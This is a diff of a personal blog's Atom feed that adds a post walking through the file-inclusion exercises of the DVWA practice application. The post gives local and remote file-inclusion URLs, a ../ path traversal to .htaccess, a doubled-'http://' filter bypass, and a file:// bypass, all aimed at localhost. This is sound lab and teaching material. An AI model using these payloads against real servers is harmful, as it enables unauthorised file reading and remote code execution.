@@ -1,4 +1,99 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-08-01T17:33:37+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">Vim Config</title><link href="http://songzy12.github.io/2020/07/13/vim-config.html" rel="alternate" type="text/html" title="Vim Config" /><published>2020-07-13T21:18:08+08:00</published><updated>2020-07-13T21:18:08+08:00</updated><id>http://songzy12.github.io/2020/07/13/vim-config</id><content type="html" xml:base="http://songzy12.github.io/2020/07/13/vim-config.html">&lt;h2&gt;.vimrc&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-08-02T22:46:21+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">File Inclusion</title><link href="http://songzy12.github.io/2020/08/02/file-inclusion.html" rel="alternate" type="text/html" title="File Inclusion" /><published>2020-08-02T15:32:25+08:00</published><updated>2020-08-02T15:32:25+08:00</updated><id>http://songzy12.github.io/2020/08/02/file-inclusion</id><content type="html" xml:base="http://songzy12.github.io/2020/08/02/file-inclusion.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/fi/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/fi/index.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;allow-url-include&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;vi /etc/php/7.2/apache2/php.ini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;txt&quot;&gt;; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
+; http://php.net/allow-url-fopen
+allow_url_fopen = On
+
+; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
+; http://php.net/allow-url-include
+allow_url_include = On
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;php include function&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/en/function.include.php&quot;&gt;https://www.php.net/manual/en/function.include.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;The include statement includes and evaluates the specified file.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;if( isset( $file ) )
+    include( $file );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Low&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;// The page we wish to display
+$file = $_GET[ 'page' ];
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;local file inclusion&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:8080/DVWA/vulnerabilities/fi/?page=file4.php&quot;&gt;http://localhost:8080/DVWA/vulnerabilities/fi/?page=file4.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Or even more, we can&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:8080/DVWA/vulnerabilities/fi/?page=../../.htaccess&quot;&gt;http://localhost:8080/DVWA/vulnerabilities/fi/?page=../../.htaccess&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3&gt;remote file inclusion&lt;/h3&gt;
+
+&lt;p&gt;We can provide a &lt;code&gt;phpinfo.php&lt;/code&gt; at some &lt;code&gt;http://&lt;/code&gt; url by python SimpleHTTPServer:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+echo phpinfo()
+
+?&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then access:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:8080/DVWA/vulnerabilities/fi/?page=http://localhost:8000/phpinfo.php&quot;&gt;http://localhost:8080/DVWA/vulnerabilities/fi/?page=http://localhost:8000/phpinfo.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;Medium&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can just insert one more &lt;code&gt;http://&lt;/code&gt; between the original &lt;code&gt;http://&lt;/code&gt; string. For example:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:8080/DVWA/vulnerabilities/fi/?page=hthttp://tp://localhost:8000/phpinfo.php&quot;&gt;http://localhost:8080/DVWA/vulnerabilities/fi/?page=hthttp://tp://localhost:8000/phpinfo.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;High&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;amp;&amp;amp; $file != &quot;include.php&quot; ) {
+    // This isn't the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Local file is still accessible using &lt;code&gt;file://&lt;/code&gt; protocol:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://localhost:8080/DVWA/vulnerabilities/fi/?page=file:///var/www/html/phpinfo.php&quot;&gt;http://localhost:8080/DVWA/vulnerabilities/fi/?page=file:///var/www/html/phpinfo.php&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2&gt;Impossible&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;amp;&amp;amp; $file != &quot;file1.php&quot; &amp;amp;&amp;amp; $file != &quot;file2.php&quot; &amp;amp;&amp;amp; $file != &quot;file3.php&quot; ) {
+    // This isn't the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Reference&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://wooyun.js.org/drops/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html&quot;&gt;https://wooyun.js.org/drops/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html&lt;/a&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/fi/index.php</summary></entry><entry><title type="html">Vim Config</title><link href="http://songzy12.github.io/2020/07/13/vim-config.html" rel="alternate" type="text/html" title="Vim Config" /><published>2020-07-13T21:18:08+08:00</published><updated>2020-07-13T21:18:08+08:00</updated><id>http://songzy12.github.io/2020/07/13/vim-config</id><content type="html" xml:base="http://songzy12.github.io/2020/07/13/vim-config.html">&lt;h2&gt;.vimrc&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code&gt;set ignorecase 
 set hlsearch
@@ -521,12 +616,4 @@ if s = 1 then new_x = floor(x/p)  // C(x,1) = new_x
 
 &lt;blockquote&gt;&lt;p&gt;Arithmetic coding differs from other forms of entropy encoding, such as Huffman coding, in that rather than separating the input into component symbols and replacing each with a code, arithmetic coding encodes the entire message into a single number, an arbitrary-precision fraction q where $0.0 \le q &amp;lt; 1.0$. It represents the current information as a range, defined by two numbers.&lt;/p&gt;&lt;/blockquote&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/Arithmetic_coding.svg.png&quot; alt=&quot;Example&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Arithmetic_coding</summary></entry><entry><title type="html">Shannon–Fano Coding</title><link href="http://songzy12.github.io/2020/06/25/shannon-fano-coding.html" rel="alternate" type="text/html" title="Shannon–Fano Coding" /><published>2020-06-25T21:00:31+08:00</published><updated>2020-06-25T21:00:31+08:00</updated><id>http://songzy12.github.io/2020/06/25/shannon-fano-coding</id><content type="html" xml:base="http://songzy12.github.io/2020/06/25/shannon-fano-coding.html">&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Shannon%E2%80%93Fano_coding&quot;&gt;https://en.wikipedia.org/wiki/Shannon%E2%80%93Fano_coding&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2&gt;Shannon Coding&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Shannon_Code.png&quot; alt=&quot;Shannon Code&quot; /&gt;&lt;/p&gt;
-
-&lt;h2&gt;Fano Coding&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Fano_Code.png&quot; alt=&quot;Fano Code&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Shannon%E2%80%93Fano_coding</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/img/Arithmetic_coding.svg.png&quot; alt=&quot;Example&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Arithmetic_coding</summary></entry></feed>
